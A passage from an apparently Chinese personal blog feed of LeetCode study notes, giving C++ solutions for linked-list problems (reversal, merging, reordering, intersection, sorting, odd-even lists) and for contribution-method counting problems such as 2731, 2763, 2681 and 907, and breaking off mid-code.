<h4 id="5-1-1-1-206-反转链表-力扣（Leetcode）">5.1.1.1 <a href="https://leetcode.cn/problems/reverse-linked-list/?envType=study-plan-v2&amp;envId=top-100-liked">206. 反转链表 - 力扣（Leetcode）</a></h4>
<h5 id="5-1-1-1-1-方法一：头插法">5.1.1.1.1 方法一：头插法</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode *list=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>),*p=head,*tmp;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            tmp=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">            tmp-&gt;next=list-&gt;next;</span><br><span class="line">            list-&gt;next=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list-&gt;next;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="5-1-1-1-2-方法二：迭代法">5.1.1.1.2 方法二：迭代法</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode *res=<span class="literal">nullptr</span>,*tmp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            tmp=head-&gt;next;</span><br><span class="line">            head-&gt;next=res;</span><br><span class="line">            res=head;</span><br><span class="line"></span><br><span class="line">            head=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="5-1-1-1-3-方法三：递归法">5.1.1.1.3 方法三：递归法</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>||head-&gt;next==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* newHead=<span class="built_in">reverseList</span>(head-&gt;next);</span><br><span class="line">        head-&gt;next-&gt;next=head;</span><br><span class="line">        head-&gt;next=<span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> newHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="6-2-合并链表">6.2 合并链表</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* list1, ListNode* list2)</span> </span>&#123;</span><br><span class="line">        ListNode* dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>),*p=dummy;</span><br><span class="line">        <span class="keyword">while</span>(list1&amp;&amp;list2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(list1-&gt;val&lt;=list2-&gt;val)&#123;</span><br><span class="line">                p-&gt;next=list1;</span><br><span class="line">                list1=list1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                p-&gt;next=list2;</span><br><span class="line">                list2=list2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;next=list1?list1:list2;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="5-2-1-1-143-重排链表">5.2.1.1 <a href="https://leetcode.cn/problems/reorder-list/">143. 重排链表</a></h4>
<blockquote>
<p>链表中点、链表原地翻转、链表合并</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        ListNode *next;</span><br><span class="line">        <span class="built_in">ListNode</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">        <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">        <span class="built_in">ListNode</span>(<span class="type">int</span> x, ListNode *next) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(next) &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reorderList</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        ListNode *mid = <span class="built_in">middleNode</span>(head);</span><br><span class="line">        ListNode *l1 = head, *l2 = mid-&gt;next;</span><br><span class="line">        mid-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">        l2 = <span class="built_in">reverseList</span>(l2);</span><br><span class="line">        <span class="built_in">mergeList</span>(l1, l2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到链表的中间节点(偏左)</span></span><br><span class="line">    <span class="function">ListNode *<span class="title">middleNode</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        ListNode *fast = head, *slow = head;</span><br><span class="line">        <span class="keyword">while</span> (fast-&gt;next != <span class="literal">nullptr</span> &amp;&amp; fast-&gt;next-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 翻转链表，可以使用头插法</span></span><br><span class="line">    <span class="function">ListNode *<span class="title">reverseList</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        ListNode *pre = <span class="literal">nullptr</span>, *cur = head;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            ListNode *nextTemp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = nextTemp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 合并链表</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">mergeList</span><span class="params">(ListNode *l1, ListNode *l2)</span> </span>&#123;</span><br><span class="line">        ListNode *p = l1, *q = l2;</span><br><span class="line">        <span class="keyword">while</span> (l1 &amp;&amp; l2) &#123;</span><br><span class="line">            p = l1-&gt;next;</span><br><span class="line">            q = l2-&gt;next;</span><br><span class="line"></span><br><span class="line">            l1-&gt;next = l2;</span><br><span class="line">            l2-&gt;next = p;</span><br><span class="line">            l1 = p;</span><br><span class="line">            l2 = q;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="5-2-1-2-160-相交链表">5.2.1.2 <a href="https://leetcode.cn/problems/intersection-of-two-linked-lists/">160. 相交链表</a></h4>
<p>方法一：哈希表方法二：双指针</p>
<blockquote>
<p>假设链表 A 的头节点到相交点的距离是 a，链表 B 的头节点到相交点的距离是 b，相交点 到链表终点的距离为 c。我们使用两个指针，分别指向两个链表的头节点，并以相同的速度前进，若到达链表结尾，则移动到另一条链表的头节点继续前进。按照这种前进方法，两个指针会在 a +b +c 次前进后同时到达相交节点。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">getIntersectionNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">        ListNode *h1=headA,*h2=headB;</span><br><span class="line">        <span class="keyword">while</span>(h1!=h2)&#123;</span><br><span class="line">            h1=h1==<span class="literal">nullptr</span>?headB:h1-&gt;next;</span><br><span class="line">            h2=h2==<span class="literal">nullptr</span>?headA:h2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> h1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="6-2-2-148-排序链表">6.2.2 148. 排序链表</h3>
<p>归并排序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">sortList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sortList</span>(head,<span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">sortList</span><span class="params">(ListNode* head,ListNode* tail)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;next==tail)&#123;</span><br><span class="line">            head-&gt;next=<span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ListNode* fast=head,*slow=head;</span><br><span class="line">        <span class="keyword">while</span>(fast!=tail)&#123;</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(fast!=tail)</span><br><span class="line">                fast=fast-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* mid=slow;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mergeList</span>(<span class="built_in">sortList</span>(head,mid),<span class="built_in">sortList</span>(mid,tail));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeList</span><span class="params">(ListNode* head1,ListNode* head2)</span></span>&#123;</span><br><span class="line">        ListNode* dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode* p=dummy;</span><br><span class="line">        <span class="keyword">while</span>(head1&amp;&amp;head2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head1-&gt;val&lt;=head2-&gt;val)&#123;</span><br><span class="line">                p-&gt;next=head1;</span><br><span class="line">                head1=head1-&gt;next;</span><br><span class="line">                p=p-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                p-&gt;next=head2;</span><br><span class="line">                head2=head2-&gt;next;</span><br><span class="line">                p=p-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(head1)&#123;</span><br><span class="line">            p-&gt;next=head1;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(head2)&#123;</span><br><span class="line">            p-&gt;next=head2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="6-3-链表技巧">6.3 链表技巧</h2>
<h4 id="5-3-1-1-328-奇偶链表">5.3.1.1 <a href="https://leetcode.cn/problems/odd-even-linked-list/">328. 奇偶链表</a></h4>
<p>分离节点后合并</p>
<img src="https://assets.leetcode-cn.com/solution-static/328/1.png" alt="fig1" style="zoom:50%;" />
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">oddEvenList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode* evenHead=head-&gt;next;</span><br><span class="line">        ListNode* odd=head,* even=evenHead;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(even&amp;&amp;even-&gt;next)&#123;</span><br><span class="line">            odd-&gt;next=even-&gt;next;</span><br><span class="line">            odd=odd-&gt;next;</span><br><span class="line">            even-&gt;next=odd-&gt;next;</span><br><span class="line">            even=even-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        odd-&gt;next=evenHead;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性结构</tag>
      </tags>
  </entry>
  <entry>
    <title>贡献法</title>
    <url>/2023/07/24/%E7%AE%97%E6%B3%95/%E8%B4%A1%E7%8C%AE%E6%B3%95/</url>
    <content><![CDATA[<h1>贡献法</h1>
<h4 id="2731-移动机器人"><a href="https://leetcode.cn/problems/movement-of-robots/">2731. 移动机器人</a></h4>
<p>机器人碰撞可以视为机器人互相穿过对方，最后，如何计算两两机器人之间的距离之和。</p>
<h5 id="方法一：贡献法：-累积计算两个点之间的线段距离和">方法一：贡献法： 累积计算两个点之间的线段距离和</h5>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202306131543462.png" alt="image.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD=<span class="number">1e9</span><span class="number">+7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumDistance</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, string s, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">                nums[i]-=d;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                nums[i]+=d;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> line=<span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            line+=n-i;</span><br><span class="line">            ans=(ans+(line%MOD)*((<span class="type">long</span> <span class="type">long</span>)nums[i]-nums[i<span class="number">-1</span>]))%MOD;</span><br><span class="line">            line-=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="方法二：前缀和">方法二：前缀和</h5>
<p>第i个机器人与其左侧i-1个机器人距离之和：<br>
$$<br>
(a[i]-a[0])+(a[i]-a[1])+…+(a[i]-a[i-1])=i*a[i]-(a[0]+a[1]+…+a[i-1])<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD=<span class="number">1e9</span><span class="number">+7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumDistance</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, string s, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">a</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">               a[i]=(<span class="type">long</span> <span class="type">long</span>)nums[i]-d;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                a[i]=(<span class="type">long</span> <span class="type">long</span>)nums[i]+d;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            ans=(ans+i*a[i]-sum)%MOD;</span><br><span class="line">            sum+=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h5 id="方法三：贡献法（累积每个数字的贡献）">方法三：贡献法（累积每个数字的贡献）</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD=<span class="number">1e9</span><span class="number">+7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumDistance</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, string s, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">result</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="comment">//计算最终位置</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">                result[i]=(<span class="type">long</span> <span class="type">long</span>)nums[i]-d;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result[i]=(<span class="type">long</span> <span class="type">long</span>)nums[i]+d;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(result.<span class="built_in">begin</span>(),result.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> sum=<span class="built_in">accumulate</span>(result.<span class="built_in">begin</span>(),result.<span class="built_in">end</span>(),<span class="number">0LL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            sum-=result[i];</span><br><span class="line">            ans=(ans+(sum-(n<span class="number">-1</span>-i)*(<span class="type">long</span> <span class="type">long</span>)result[i]))%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2763-所有子数组中不平衡数字之和"><a href="https://leetcode.cn/problems/sum-of-imbalance-numbers-of-all-subarrays/">2763. 所有子数组中不平衡数字之和</a></h3>
<h4 id="方法一：枚举">方法一：枚举</h4>
<blockquote>
<p>题目规定<code>sarr[i+1] - sarr[i] &gt; 1</code>为不平衡数字。</p>
<p>枚举子数组，i作为左侧边界，同时不断扩展右侧边界。在扩展右侧边界时，记录不平衡数字变化情况。如果<code>x-1</code>和<code>x+1</code>都存在，添加<code>x</code>使得不平衡数字减1。都不存在时，将使得当前数字与某一个数字构成不平衡数字。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307242040633.png" alt="image-20230724204058509"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumImbalanceNumbers</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">bool</span> vis[n<span class="number">+2</span>];</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="built_in">sizeof</span>(vis));</span><br><span class="line">            vis[nums[i]]=<span class="literal">true</span>;</span><br><span class="line">            <span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i<span class="number">+1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="type">int</span> x=nums[j];</span><br><span class="line">                <span class="comment">// x-1 , x, x+1</span></span><br><span class="line">                <span class="comment">// x-1, x+1都存在，cnt-1</span></span><br><span class="line">                <span class="comment">// x-1, x+1都不存在,cnt+1</span></span><br><span class="line">                <span class="keyword">if</span>(!vis[x])&#123;</span><br><span class="line">                    cnt+=<span class="number">1</span>-vis[x<span class="number">-1</span>]-vis[x<span class="number">+1</span>];</span><br><span class="line">                    vis[x]=<span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ans+=cnt;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="方法二：贡献法">方法二：贡献法</h4>
<p>统计每个数字对不平衡数字的贡献数，<code>x=nums[i]</code>，子数组中如果存在<code>x-1</code>，则<code>x</code>肯定无法成为不平衡数字。同时为了避免重复统计，子数组中可以存在<code>x+1</code>。这考虑的是<code>x</code>作为不平衡数字的较大数字的贡献度。子数组左边可以包含<code>x</code>。同时，每个数字可能作为子数组的最小值，这种情况排序后的子数组分别有<code>n,n-1,..,1</code>个。</p>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307242115550.png" alt="image-20230724211517496"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumImbalanceNumbers</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 统计每个数字对于不平衡数字的贡献</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">right</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">idx</span><span class="params">(n + <span class="number">1</span>, n)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// right[i]表示x=nums[i]，[i+1:]范围内最接近的值为x或者x-1的下标</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">int</span> x = nums[i];</span><br><span class="line">            right[i] = <span class="built_in">min</span>(idx[x], idx[x - <span class="number">1</span>]);</span><br><span class="line">            idx[x] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        idx.<span class="built_in">assign</span>(n + <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = nums[i];</span><br><span class="line">            <span class="type">int</span> l = idx[x - <span class="number">1</span>], r = right[i];</span><br><span class="line">            ans += (i - l) * (r - i);</span><br><span class="line">            idx[x] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans - n * (n + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2681-英雄的力量"><a href="https://leetcode.cn/problems/power-of-heroes/">2681. 英雄的力量</a></h3>
<p>$$<br>
a,b,c,d,e\<br>
d作为最大值：a<em>2<sup>2+b*2</sup>1+c</em>2^0+d=s+d\<br>
e作为最大值：a<em>2<sup>3+b*2</sup>3+c</em>2<sup>1+d*2</sup>0+e=2*s+d+e<br>
$$</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">// a,b,c,d,e</span></span><br><span class="line"><span class="comment">// a*4+b*2+c*1</span></span><br><span class="line"><span class="comment">// a*2+b*1</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD=<span class="number">1e9</span><span class="number">+7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumOfPower</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> s=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> num:nums)&#123;</span><br><span class="line">            ans=(((s+num)*num%MOD)*num+ans)%MOD;</span><br><span class="line">            s=(s*<span class="number">2</span>+num)%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="907-子数组的最小值之和"><a href="https://leetcode.cn/problems/sum-of-subarray-minimums/">907. 子数组的最小值之和</a></h3>
<blockquote>
<p>不限制右侧可以等于的情况产生重复计算</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic2023/202307252239119.png" alt="image-20230725223937045"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumSubarrayMins</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;arr)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = arr.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// right[i]表示[i:]右侧 小于等于arr[i]的最近位置</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">right</span><span class="params">(n, n)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="comment">// 栈顶为大值</span></span><br><span class="line">            <span class="keyword">while</span> (!stk.<span class="built_in">empty</span>() 